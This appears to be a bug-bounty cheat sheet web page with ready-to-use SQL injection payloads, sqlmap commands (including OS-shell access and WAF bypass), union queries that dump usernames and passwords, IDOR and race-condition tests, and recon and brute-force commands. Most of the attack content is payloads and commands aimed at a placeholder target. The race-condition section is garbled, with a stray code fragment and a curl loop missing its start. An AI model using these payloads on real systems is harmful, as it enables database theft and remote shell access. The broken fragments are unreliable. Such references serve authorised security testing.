💉 SQL Injection (SQLi)

$$$: High Payout ▶

What: Attacker injects malicious SQL queries into input fields, URLs, or headers to manipulate the database.

1
Find injectable parameters — Look for user input: search boxes, login forms, URL params, headers, cookies, API body.
2
Test for injection — Send these basic payloads and observe errors/timeouts:
Basic Detection
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' AND SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; WAITFOR DELAY '0:0:5'--
1' AND BENCHMARK(10000000,SHA1('test'))--
3
Identify DB type from error messages:
DB Fingerprinting
# MySQL
' AND 1=CONVERT(int,@@version)--
' UNION SELECT NULL,NULL,@@version--

# PostgreSQL
' AND 1=CAST(version AS int)--
';SELECT version()--

# MSSQL
' AND 1=convert(int,@@version)--
';WAITFOR DELAY '0:0:5'--

# Oracle
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
4
Use sqlmap for automation:
sqlmap Commands
# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch --dbs

# With cookies
sqlmap -u "https://target.com/api?id=1" --cookie="session=abc123" --batch --dbs

# From Burp request file
sqlmap -r request.txt --batch --dbs

# Dump specific table
sqlmap -u "https://target.com?id=1" -D dbname -T users --dump

# Shell access
sqlmap -u "https://target.com?id=1" --os-shell

# Bypass WAF
sqlmap -u "https://target.com?id=1" --tamper=space2comment,between --random-agent --batch
5
Extract data manually (Union-based):
Union Injection
# Find column count
' ORDER BY 1--
' ORDER BY 2--
... keep going until error

# Find visible columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,NULL,NULL--
' UNION SELECT 1,2,NULL--

# Extract data
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
⚠️ Bounty tip: Blind SQLi and time-based SQLi on authenticated endpoints often pay more than error-based on public pages.

🔑 IDOR (Insecure Direct Object Reference)

$$$: High Payout ▶

What: Accessing resources by manipulating object identifiers (IDs) in API calls without proper authorization checks.

1
Map API endpoints — Look for predictable IDs in URLs, params, and API bodies: user IDs, order numbers, file paths, invoice IDs.
2
Test by changing IDs:
IDOR Testing
# Sequential IDs
GET /api/users/123 → change to /api/users/124
GET /api/invoices/456 → change to /api/invoices/457

# UUID prediction
GET /api/files/a1b2c3d4-e5f6-7890-abcd-ef1234567890

# Parameter manipulation
{"user_id": 123} → {"user_id": 124}
{"order_id": "ORD-001"} → {"order_id": "ORD-002"}

# Two-account test
1. Login as user A, note endpoint + ID
2. Login as user B, try same endpoint + ID
3. If you see user A's data = IDOR

# Encoded IDs
Base64: eyJ1c2VyX2lkIjogMTIzfQ== → {"user_id": 124}
JWT: modify payload claims
3
IDOR hunting checklist:
IDOR Checklist
□ Profile endpoints (/api/users/{id})
□ File download (/download?file=report_123.pdf)
□ Invoice/billing (/api/invoices/{id})
□ Support tickets (/api/tickets/{id})
□ Messages/notifications (/api/messages/{id})
□ Admin panels (/admin/users/{id})
□ Export endpoints (/export?user_id=123)
□ Webhook configs (/api/webhooks/{id})
□ API keys (/api/keys/{id})

def handleResponse(req, interesting):
    table.add(req)
3
Curl parallel requests:
Parallel Requests

  curl -s -X POST https://target.com/api/redeem \
    -H "Authorization: Bearer TOKEN" \
    -d "code=GIFT123" &
done

4
TOCTOU patterns:
TOCTOU Examples
# Check-then-act race
1. Check balance >= price (PASS)
2. [Attacker sends 2nd request - also passes]
3. Deduct balance (applies twice!)

# Coupon double-use

If balance deducted 10x = vulnerable

# File upload race
1. Upload -> temp path created
2. Extension check happens
3. [Swap content before rename]
💡 Bounty tip: Race conditions allowing double-spending or coupon reuse are high-value. Document with video proof of concurrent requests.

🔍 Recon Commands

▶
Subdomain Enumeration
# Subfinder
subfinder -d target.com -all -o subs.txt

# Amass
amass enum -passive -d target.com -o subs_amass.txt

# Assetfinder
assetfinder --subs-only target.com > subs_asset.txt

# Combine & sort
cat subs.txt subs_amass.txt subs_asset.txt | sort -u > all_subs.txt

# DNS resolution
cat all_subs.txt | dnsx -silent -a -resp-only > alive.txt

# httpx - find live hosts
cat alive.txt | httpx -silent -status-code -title -tech-detect -o live.txt
Port Scanning
# Naabu (fast port scan)
cat alive.txt | naabu -top-ports 1000 -silent -o ports.txt

# Nmap
nmap -sC -sV -p- target.com -oA nmap_full
nmap -sU --top-ports 100 target.com
Directory Bruteforcing
# Feroxbuster (recursive)
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js -o dirs.txt

# ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403

# gobuster
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js
JavaScript Analysis
# LinkFinder
python3 linkfinder.py -i https://target.com -o cli

# SecretFinder
python3 SecretFinder.py -i https://target.com/app.js -o cli

# Find interesting strings in JS
cat js_files.txt | xargs grep -lE "(api[_-]?key|secret|token|password|auth|aws|firebase)" 2>/dev/null

# Get JS files
cat live.txt | waybackurls | grep "\.js$" | sort -u > js_files.txt
URL Collection
# Wayback Machine
cat all_subs.txt | waybackurls > wayback.txt

# GAU (GetAllUrls)
cat all_subs.txt | gau --threads 5 > gau.txt

# Combine & filter
cat wayback.txt gau.txt | sort -u > all_urls.txt

# Find interesting params
cat all_urls.txt | grep "=" | sort -u > params.txt

# Find endpoints with specific extensions
cat all_urls.txt | grep -E "\.(php|asp|aspx|jsp|json|xml)" > api_endpoints.txt
